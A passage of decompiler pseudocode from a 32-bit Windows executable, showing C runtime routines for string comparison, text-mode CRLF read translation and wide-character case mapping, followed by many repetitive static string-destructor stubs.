}
// 46640C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 466454: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);
// 46FCE0: using guessed type int __acrt_getptd(void);
// 4794B6: using guessed type _DWORD __cdecl _updatetlocinfoEx_nolock(_DWORD, _DWORD);
// 4F83B8: using guessed type int dword_4F83B8;

//----- (0047B8B6) --------------------------------------------------------
int __cdecl sub_47B8B6(char *String1, char *String2, size_t MaxCount)
{
  if ( dword_500560 )
    return _strnicmp_l(String1, String2, MaxCount, 0);
  if ( String1 && String2 && MaxCount <= 0x7FFFFFFF )
    return sub_47F7E0(String1, String2, MaxCount);
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0x7FFFFFFF;
}
// 47F7E0: using guessed type _DWORD __cdecl sub_47F7E0(_DWORD, _DWORD, _DWORD);
// 500560: using guessed type int dword_500560;

//----- (0047DACA) --------------------------------------------------------
int __cdecl sub_47DACA(int FileHandle, char *a2, int a3)
{
  int v3; // edx
  int v4; // edi
  LPCRITICAL_SECTION v5; // eax
  char *v6; // esi
  char *v7; // eax
  char v8; // cl
  char v9; // ch
  char v10; // cl
  int v11; // eax
  LPCRITICAL_SECTION v12; // ecx
  char v13; // al
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-1Ch] BYREF
  HANDLE hFile; // [esp+10h] [ebp-18h]
  char *v17; // [esp+14h] [ebp-14h]
  unsigned int v18; // [esp+18h] [ebp-10h]
  int v19; // [esp+1Ch] [ebp-Ch]
  char *v20; // [esp+20h] [ebp-8h]
  char Buffer; // [esp+27h] [ebp-1h] BYREF

  v3 = FileHandle >> 6;
  v4 = 56 * (FileHandle & 0x3F);
  v19 = FileHandle >> 6;
  v5 = lpCriticalSection[FileHandle >> 6];
  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v5[1].DebugInfo + v4);
  if ( a3 && *a2 == 10 )
    *((_BYTE *)&v5[1].LockSemaphore + v4) |= 4u;
  else
    *((_BYTE *)&v5[1].LockSemaphore + v4) &= ~4u;
  v20 = a2;
  v18 = (unsigned int)&a2[a3];
  v6 = a2;
  if ( a2 < &a2[a3] )
  {
    v7 = a2;
    while ( 1 )
    {
      v8 = *v7;
      if ( *v7 == 26 )
      {
        v12 = lpCriticalSection[v3];
        v13 = *((_BYTE *)&v12[1].LockSemaphore + v4);
        if ( (v13 & 0x40) != 0 )
          *v6++ = 26;
        else
          *((_BYTE *)&v12[1].LockSemaphore + v4) = v13 | 2;
        return v6 - a2;
      }
      ++v7;
      if ( v8 == 13 )
        break;
      *v6++ = v8;
      v20 = v7;
LABEL_30:
      if ( (unsigned int)v7 >= v18 )
        return v6 - a2;
    }
    if ( (unsigned int)v7 < v18 )
    {
      v9 = *v7;
      v17 = v6 + 1;
      if ( v9 == 10 )
        v8 = 10;
      *v6 = v8;
      v6 = v17;
      v7 = &v20[(v9 == 10) + 1];
      v20 = v7;
      goto LABEL_30;
    }
    v20 = v7;
    if ( ReadFile(hFile, &Buffer, 1u, &NumberOfBytesRead, 0) && NumberOfBytesRead )
    {
      v3 = v19;
      if ( (*((_BYTE *)&lpCriticalSection[v19][1].LockSemaphore + v4) & 0x48) != 0 )
      {
        v10 = Buffer;
        v11 = (int)(v6 + 1);
        v17 = v6 + 1;
        if ( Buffer == 10 )
        {
          *v6 = 10;
        }
        else
        {
          *v6 = 13;
          *((_BYTE *)&lpCriticalSection[v3][1].LockSemaphore + v4 + 2) = v10;
          v11 = (int)v17;
        }
        v6 = (char *)v11;
        goto LABEL_29;
      }
      if ( Buffer == 10 && v6 == a2 )
      {
        *v6 = 10;
LABEL_28:
        ++v6;
        goto LABEL_29;
      }
      _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-1i64, 1u);
      v3 = v19;
      if ( Buffer == 10 )
      {
LABEL_29:
        v7 = v20;
        goto LABEL_30;
      }
    }
    else
    {
      v3 = v19;
    }
    *v6 = 13;
    goto LABEL_28;
  }
  return v6 - a2;
}
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];

//----- (0047DC2B) --------------------------------------------------------
unsigned int __cdecl sub_47DC2B(int FileHandle, char *a2, int a3)
{
  char *v3; // ebx
  int v4; // ecx
  int v5; // edi
  LPCRITICAL_SECTION v6; // eax
  __int16 *v7; // esi
  char *v8; // edx
  __int16 v9; // ax
  unsigned __int16 *v10; // ecx
  bool v11; // zf
  __int16 v12; // dx
  int v13; // eax
  LPCRITICAL_SECTION v14; // ecx
  char v15; // al
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-24h] BYREF
  HANDLE hFile; // [esp+14h] [ebp-20h]
  __int16 *v19; // [esp+18h] [ebp-1Ch]
  int v20; // [esp+1Ch] [ebp-18h]
  int v21; // [esp+20h] [ebp-14h]
  unsigned int v22; // [esp+24h] [ebp-10h]
  char *v23; // [esp+28h] [ebp-Ch]
  int v24; // [esp+2Ch] [ebp-8h]
  __int16 Buffer; // [esp+30h] [ebp-4h] BYREF

  v3 = a2;
  v4 = FileHandle >> 6;
  v5 = 56 * (FileHandle & 0x3F);
  v24 = FileHandle >> 6;
  v6 = lpCriticalSection[FileHandle >> 6];
  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v6[1].DebugInfo + v5);
  if ( a3 && *(_WORD *)a2 == 10 )
    *((_BYTE *)&v6[1].LockSemaphore + v5) |= 4u;
  else
    *((_BYTE *)&v6[1].LockSemaphore + v5) &= ~4u;
  v7 = (__int16 *)a2;
  v22 = (unsigned int)&a2[2 * a3];
  v8 = a2;
  if ( (unsigned int)a2 < v22 )
  {
    v21 = 26;
    v20 = 13;
    while ( 1 )
    {
      v9 = *(_WORD *)v8;
      if ( *(_WORD *)v8 == (_WORD)v21 )
      {
        v14 = lpCriticalSection[v4];
        v15 = *((_BYTE *)&v14[1].LockSemaphore + v5);
        if ( (v15 & 0x40) != 0 )
          *v7++ = 26;
        else
          *((_BYTE *)&v14[1].LockSemaphore + v5) = v15 | 2;
        return ((char *)v7 - v3) & 0xFFFFFFFE;
      }
      v10 = (unsigned __int16 *)(v8 + 2);
      if ( v9 != (_WORD)v20 )
      {
        v8 += 2;
        goto LABEL_29;
      }
      if ( (unsigned int)v10 < v22 )
        break;
      v23 = v8 + 2;
      if ( !ReadFile(hFile, &Buffer, 2u, &NumberOfBytesRead, 0) || !NumberOfBytesRead )
      {
        v8 = v23;
        goto LABEL_28;
      }
      v4 = v24;
      if ( (*((_BYTE *)&lpCriticalSection[v24][1].LockSemaphore + v5) & 0x48) != 0 )
      {
        v12 = Buffer;
        v13 = (int)(v7 + 1);
        v19 = v7 + 1;
        if ( Buffer == 10 )
        {
          *v7 = 10;
        }
        else
        {
          *v7 = 13;
          *(_WORD *)((char *)&lpCriticalSection[v4][1].LockSemaphore + v5 + 2) = v12;
          *((_BYTE *)&lpCriticalSection[v4][1].SpinCount + v5) = 10;
          v13 = (int)v19;
        }
        v7 = (__int16 *)v13;
      }
      else
      {
        if ( Buffer != 10 || v7 != (__int16 *)v3 )
        {
          _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-2i64, 1u);
          v8 = v23;
          if ( Buffer != 10 )
          {
LABEL_28:
            v9 = 13;
LABEL_29:
            *v7++ = v9;
          }
LABEL_30:
          v4 = v24;
          goto LABEL_31;
        }
        *v7++ = 10;
      }
      v8 = v23;
LABEL_31:
      if ( (unsigned int)v8 >= v22 )
        return ((char *)v7 - v3) & 0xFFFFFFFE;
    }
    v23 = (char *)*v10;
    v19 = v7 + 1;
    if ( (_WORD)v23 == 10 )
      v9 = 10;
    v11 = (_WORD)v23 == 10;
    v3 = a2;
    *v7 = v9;
    v7 = v19;
    v8 += 2 * v11 + 2;
    goto LABEL_30;
  }
  return ((char *)v7 - v3) & 0xFFFFFFFE;
}
// 500720: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];

//----- (0047E9A8) --------------------------------------------------------
unsigned int __cdecl sub_47E9A8(unsigned int a1)
{
  unsigned int v1; // esi
  int v2; // edi
  int v3; // ebx
  unsigned int v4; // eax

  v1 = (a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14;
  v2 = 0;
  if ( (a1 & 0x3000) != 0 )
  {
    if ( (a1 & 0x3000) == 4096 )
      v3 = 512;
    else
      v3 = 0;
  }
  else
  {
    v3 = 768;
  }
  v4 = ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 14) & 0x300;
  if ( (v1 & 0x300) != 0 )
  {
    switch ( v4 )
    {
      case 0x100u:
        v2 = 1024;
        break;
      case 0x200u:
        v2 = 2048;
        break;
      case 0x300u:
        v2 = 3072;
        break;
    }
  }
  return v2 | v3 | (a1 >> 2) & 0x1000 | (32 * (v1 & 1)) | ((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 18) & 1 | (2 * ((v1 >> 5) & 1)) | (8 * ((v1 >> 2) & 1)) | (16 * ((v1 >> 1) & 1)) | (4 * (((a1 & 0xC00000 | (a1 >> 2) & 0xFC000) >> 17) & 1));
}

//----- (0047F03E) --------------------------------------------------------
int __cdecl sub_47F03E(wchar_t Source, struct __crt_locale_pointers *a2)
{
  int result; // eax
  wchar_t *v3; // eax
  int v4; // [esp+0h] [ebp-14h] BYREF
  int v5; // [esp+4h] [ebp-10h]
  char v6; // [esp+Ch] [ebp-8h]
  WCHAR DestStr; // [esp+10h] [ebp-4h] BYREF

  result = 0xFFFF;
  if ( Source != 0xFFFF )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v4, a2);
    if ( Source >= 0x100u )
    {
      v3 = *(wchar_t **)(v5 + 168);
      if ( v3 )
      {
        if ( __acrt_LCMapStringW(v3, 0x100u, &Source, 1u, &DestStr, 1) )
        {
          result = DestStr;
LABEL_14:
          if ( v6 )
            *(_DWORD *)(v4 + 848) &= ~2u;
          return result;
        }
        LOWORD(result) = Source;
      }
      else
      {
        LOWORD(result) = Source;
      }
    }
    else if ( (_wctype[(unsigned __int8)Source + 1] & 1) != 0 )
    {
      LOWORD(result) = *(unsigned __int8 *)(*(_DWORD *)(v5 + 148) + (unsigned __int8)Source);
    }
    else
    {
      LOWORD(result) = (unsigned __int8)Source;
    }
    result = (unsigned __int16)result;
    goto LABEL_14;
  }
  return result;
}

//----- (0047FEAC) --------------------------------------------------------
BOOL sub_47FEAC()
{
  char *v0; // ecx

  v0 = (char *)hConsoleOutput;
  if ( hConsoleOutput == (HANDLE)-2 )
  {
    __dcrt_lowio_initialize_console_output();
    v0 = (char *)hConsoleOutput;
  }
  return v0 + 1 != 0;
}

//----- (00480294) --------------------------------------------------------
int __cdecl sub_480294(double a1)
{
  return _ceil_default(a1);
}

//----- (00481093) --------------------------------------------------------
unsigned __int64 __usercall sub_481093@<edx:eax>(unsigned __int64 a1@<edx:eax>)
{
  int v1; // ecx
  bool v2; // cc
  char v3; // cl

  v1 = HIDWORD(a1) >> 20;
  HIDWORD(a1) = HIDWORD(a1) & 0xFFFFF | 0x100000;
  v2 = v1 < 1075;
  v3 = v1 - 51;
  if ( v2 )
    return a1 >> (-v3 & 0x1F);
  else
    return a1 << (v3 & 0x1F);
}

//----- (00481850) --------------------------------------------------------
int __usercall sub_481850@<eax>(int a1@<ebp>)
{
  return sub_409B50((_Mtx_t *)(a1 - 16));
}

//----- (00481880) --------------------------------------------------------
int __usercall sub_481880@<eax>(int a1@<ebp>)
{
  return sub_409B50((_Mtx_t *)(a1 - 32));
}

//----- (00481888) --------------------------------------------------------
void __usercall sub_481888(int a1@<ebp>)
{
  sub_409BA0(a1 - 24);
}

//----- (00481910) --------------------------------------------------------
void __usercall sub_481910(int a1@<ebp>)
{
  sub_409BA0(a1 - 24);
}

//----- (00481DE0) --------------------------------------------------------
void __usercall sub_481DE0(int a1@<ebp>)
{
  sub_409BA0(a1 - 24);
}

//----- (00481E10) --------------------------------------------------------
int __usercall sub_481E10@<eax>(int a1@<ebp>)
{
  return sub_409B50((_Mtx_t *)(a1 - 20));
}

//----- (00481E18) --------------------------------------------------------
int __usercall sub_481E18@<eax>(int a1@<ebp>)
{
  return sub_407110((_DWORD *)(a1 - 72));
}

//----- (00481E20) --------------------------------------------------------
void __usercall sub_481E20(int a1@<ebp>)
{
  sub_44775B(*(void **)(a1 - 20));
}

//----- (00481E2F) --------------------------------------------------------
int __usercall sub_481E2F@<eax>(int a1@<ebp>)
{
  return sub_407110(*(_DWORD **)(a1 - 24));
}

//----- (004830F0) --------------------------------------------------------
void __usercall sub_4830F0(int a1@<ebp>)
{
  sub_409BA0(a1 - 28);
}

//----- (00486C80) --------------------------------------------------------
void __cdecl sub_486C80()
{
  volatile signed __int32 *v0; // esi

  v0 = (volatile signed __int32 *)dword_5009A0;
  if ( dword_5009A0 && !_InterlockedExchangeAdd((volatile signed __int32 *)(dword_5009A0 + 4), 0xFFFFFFFF) )
  {
    (**(void (__thiscall ***)(volatile signed __int32 *))v0)(v0);
    if ( !_InterlockedDecrement(v0 + 2) )
      (*(void (__thiscall **)(volatile signed __int32 *))(*v0 + 4))(v0);
  }
}
// 5009A0: using guessed type int dword_5009A0;

//----- (00486CC0) --------------------------------------------------------
void __cdecl sub_486CC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A0C >= 0x10 )
  {
    v0 = Buf;
    if ( (unsigned int)(dword_4F8A0C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)Buf - 1);
      if ( (unsigned int)((_BYTE *)Buf - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  MaxCount = 0;
  dword_4F8A0C = 15;
  LOBYTE(Buf) = 0;
}
// 4F8A0C: using guessed type int dword_4F8A0C;

//----- (00486D20) --------------------------------------------------------
void __cdecl sub_486D20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D54 >= 0x10 )
  {
    v0 = dword_4F8D40;
    if ( (unsigned int)(dword_4F8D54 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D40 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D40 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D50 = 0;
  dword_4F8D54 = 15;
  LOBYTE(dword_4F8D40) = 0;
}
// 4F8D50: using guessed type int dword_4F8D50;
// 4F8D54: using guessed type int dword_4F8D54;

//----- (00486D80) --------------------------------------------------------
void __cdecl sub_486D80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B8C >= 0x10 )
  {
    v0 = dword_4F8B78;
    if ( (unsigned int)(dword_4F8B8C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B78 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B78 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B88 = 0;
  dword_4F8B8C = 15;
  LOBYTE(dword_4F8B78) = 0;
}
// 4F8B88: using guessed type int dword_4F8B88;
// 4F8B8C: using guessed type int dword_4F8B8C;

//----- (00486DE0) --------------------------------------------------------
void __cdecl sub_486DE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8ACC >= 0x10 )
  {
    v0 = dword_4F8AB8;
    if ( (unsigned int)(dword_4F8ACC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8AB8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8AB8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8AC8 = 0;
  dword_4F8ACC = 15;
  LOBYTE(dword_4F8AB8) = 0;
}
// 4F8AC8: using guessed type int dword_4F8AC8;
// 4F8ACC: using guessed type int dword_4F8ACC;

//----- (00486E40) --------------------------------------------------------
void __cdecl sub_486E40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C4C >= 0x10 )
  {
    v0 = dword_4F8C38;
    if ( (unsigned int)(dword_4F8C4C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C38 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C38 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C48 = 0;
  dword_4F8C4C = 15;
  LOBYTE(dword_4F8C38) = 0;
}
// 4F8C48: using guessed type int dword_4F8C48;
// 4F8C4C: using guessed type int dword_4F8C4C;

//----- (00486EA0) --------------------------------------------------------
void __cdecl sub_486EA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D9C >= 0x10 )
  {
    v0 = dword_4F8D88;
    if ( (unsigned int)(dword_4F8D9C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D88 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D88 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D98 = 0;
  dword_4F8D9C = 15;
  LOBYTE(dword_4F8D88) = 0;
}
// 4F8D98: using guessed type int dword_4F8D98;
// 4F8D9C: using guessed type int dword_4F8D9C;

//----- (00486F00) --------------------------------------------------------
void __cdecl sub_486F00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8BD4 >= 0x10 )
  {
    v0 = dword_4F8BC0;
    if ( (unsigned int)(dword_4F8BD4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8BC0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8BC0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8BD0 = 0;
  dword_4F8BD4 = 15;
  LOBYTE(dword_4F8BC0) = 0;
}
// 4F8BD0: using guessed type int dword_4F8BD0;
// 4F8BD4: using guessed type int dword_4F8BD4;

//----- (00486F60) --------------------------------------------------------
void __cdecl sub_486F60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D84 >= 0x10 )
  {
    v0 = dword_4F8D70;
    if ( (unsigned int)(dword_4F8D84 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D70 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D70 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D80 = 0;
  dword_4F8D84 = 15;
  LOBYTE(dword_4F8D70) = 0;
}
// 4F8D80: using guessed type int dword_4F8D80;
// 4F8D84: using guessed type int dword_4F8D84;

//----- (00486FC0) --------------------------------------------------------
void __cdecl sub_486FC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8BEC >= 0x10 )
  {
    v0 = dword_4F8BD8;
    if ( (unsigned int)(dword_4F8BEC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8BD8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8BD8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8BE8 = 0;
  dword_4F8BEC = 15;
  LOBYTE(dword_4F8BD8) = 0;
}
// 4F8BE8: using guessed type int dword_4F8BE8;
// 4F8BEC: using guessed type int dword_4F8BEC;

//----- (00487020) --------------------------------------------------------
void __cdecl sub_487020()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8DFC >= 0x10 )
  {
    v0 = dword_4F8DE8;
    if ( (unsigned int)(dword_4F8DFC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8DE8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8DE8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8DF8 = 0;
  dword_4F8DFC = 15;
  LOBYTE(dword_4F8DE8) = 0;
}
// 4F8DF8: using guessed type int dword_4F8DF8;
// 4F8DFC: using guessed type int dword_4F8DFC;

//----- (00487080) --------------------------------------------------------
void __cdecl sub_487080()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D24 >= 0x10 )
  {
    v0 = dword_4F8D10;
    if ( (unsigned int)(dword_4F8D24 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D10 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D10 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D20 = 0;
  dword_4F8D24 = 15;
  LOBYTE(dword_4F8D10) = 0;
}
// 4F8D20: using guessed type int dword_4F8D20;
// 4F8D24: using guessed type int dword_4F8D24;

//----- (004870E0) --------------------------------------------------------
void __cdecl sub_4870E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E74 >= 0x10 )
  {
    v0 = dword_4F8E60;
    if ( (unsigned int)(dword_4F8E74 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E60 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E60 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E70 = 0;
  dword_4F8E74 = 15;
  LOBYTE(dword_4F8E60) = 0;
}
// 4F8E70: using guessed type int dword_4F8E70;
// 4F8E74: using guessed type int dword_4F8E74;

//----- (00487140) --------------------------------------------------------
void __cdecl sub_487140()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8CAC >= 0x10 )
  {
    v0 = dword_4F8C98;
    if ( (unsigned int)(dword_4F8CAC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C98 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C98 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8CA8 = 0;
  dword_4F8CAC = 15;
  LOBYTE(dword_4F8C98) = 0;
}
// 4F8CA8: using guessed type int dword_4F8CA8;
// 4F8CAC: using guessed type int dword_4F8CAC;

//----- (004871A0) --------------------------------------------------------
void __cdecl sub_4871A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C04 >= 0x10 )
  {
    v0 = dword_4F8BF0;
    if ( (unsigned int)(dword_4F8C04 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8BF0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8BF0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C00 = 0;
  dword_4F8C04 = 15;
  LOBYTE(dword_4F8BF0) = 0;
}
// 4F8C00: using guessed type int dword_4F8C00;
// 4F8C04: using guessed type int dword_4F8C04;

//----- (00487200) --------------------------------------------------------
void __cdecl sub_487200()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C1C >= 0x10 )
  {
    v0 = dword_4F8C08;
    if ( (unsigned int)(dword_4F8C1C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C08 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C08 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C18 = 0;
  dword_4F8C1C = 15;
  LOBYTE(dword_4F8C08) = 0;
}
// 4F8C18: using guessed type int dword_4F8C18;
// 4F8C1C: using guessed type int dword_4F8C1C;

//----- (00487260) --------------------------------------------------------
void __cdecl sub_487260()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8AE4 >= 0x10 )
  {
    v0 = dword_4F8AD0;
    if ( (unsigned int)(dword_4F8AE4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8AD0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8AD0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8AE0 = 0;
  dword_4F8AE4 = 15;
  LOBYTE(dword_4F8AD0) = 0;
}
// 4F8AE0: using guessed type int dword_4F8AE0;
// 4F8AE4: using guessed type int dword_4F8AE4;

//----- (004872C0) --------------------------------------------------------
void __cdecl sub_4872C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C64 >= 0x10 )
  {
    v0 = dword_4F8C50;
    if ( (unsigned int)(dword_4F8C64 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C50 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C50 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C60 = 0;
  dword_4F8C64 = 15;
  LOBYTE(dword_4F8C50) = 0;
}
// 4F8C60: using guessed type int dword_4F8C60;
// 4F8C64: using guessed type int dword_4F8C64;

//----- (00487320) --------------------------------------------------------
void __cdecl sub_487320()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8CC4 >= 0x10 )
  {
    v0 = dword_4F8CB0;
    if ( (unsigned int)(dword_4F8CC4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8CB0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8CB0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8CC0 = 0;
  dword_4F8CC4 = 15;
  LOBYTE(dword_4F8CB0) = 0;
}
// 4F8CC0: using guessed type int dword_4F8CC0;
// 4F8CC4: using guessed type int dword_4F8CC4;

//----- (00487380) --------------------------------------------------------
void __cdecl sub_487380()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D3C >= 0x10 )
  {
    v0 = dword_4F8D28;
    if ( (unsigned int)(dword_4F8D3C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D28 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D28 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D38 = 0;
  dword_4F8D3C = 15;
  LOBYTE(dword_4F8D28) = 0;
}
// 4F8D38: using guessed type int dword_4F8D38;
// 4F8D3C: using guessed type int dword_4F8D3C;

//----- (004873E0) --------------------------------------------------------
void __cdecl sub_4873E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D0C >= 0x10 )
  {
    v0 = dword_4F8CF8;
    if ( (unsigned int)(dword_4F8D0C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8CF8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8CF8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D08 = 0;
  dword_4F8D0C = 15;
  LOBYTE(dword_4F8CF8) = 0;
}
// 4F8D08: using guessed type int dword_4F8D08;
// 4F8D0C: using guessed type int dword_4F8D0C;

//----- (00487440) --------------------------------------------------------
void __cdecl sub_487440()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B74 >= 0x10 )
  {
    v0 = dword_4F8B60;
    if ( (unsigned int)(dword_4F8B74 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B60 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B60 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B70 = 0;
  dword_4F8B74 = 15;
  LOBYTE(dword_4F8B60) = 0;
}
// 4F8B70: using guessed type int dword_4F8B70;
// 4F8B74: using guessed type int dword_4F8B74;

//----- (004874A0) --------------------------------------------------------
void __cdecl sub_4874A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A3C >= 0x10 )
  {
    v0 = dword_4F8A28;
    if ( (unsigned int)(dword_4F8A3C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A28 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A28 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A38 = 0;
  dword_4F8A3C = 15;
  LOBYTE(dword_4F8A28) = 0;
}
// 4F8A38: using guessed type int dword_4F8A38;
// 4F8A3C: using guessed type int dword_4F8A3C;

//----- (00487500) --------------------------------------------------------
void __cdecl sub_487500()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A9C >= 0x10 )
  {
    v0 = dword_4F8A88;
    if ( (unsigned int)(dword_4F8A9C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A88 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A88 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A98 = 0;
  dword_4F8A9C = 15;
  LOBYTE(dword_4F8A88) = 0;
}
// 4F8A98: using guessed type int dword_4F8A98;
// 4F8A9C: using guessed type int dword_4F8A9C;

//----- (00487560) --------------------------------------------------------
void __cdecl sub_487560()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E44 >= 0x10 )
  {
    v0 = dword_4F8E30;
    if ( (unsigned int)(dword_4F8E44 + 1) >= 0x1000 )
    {
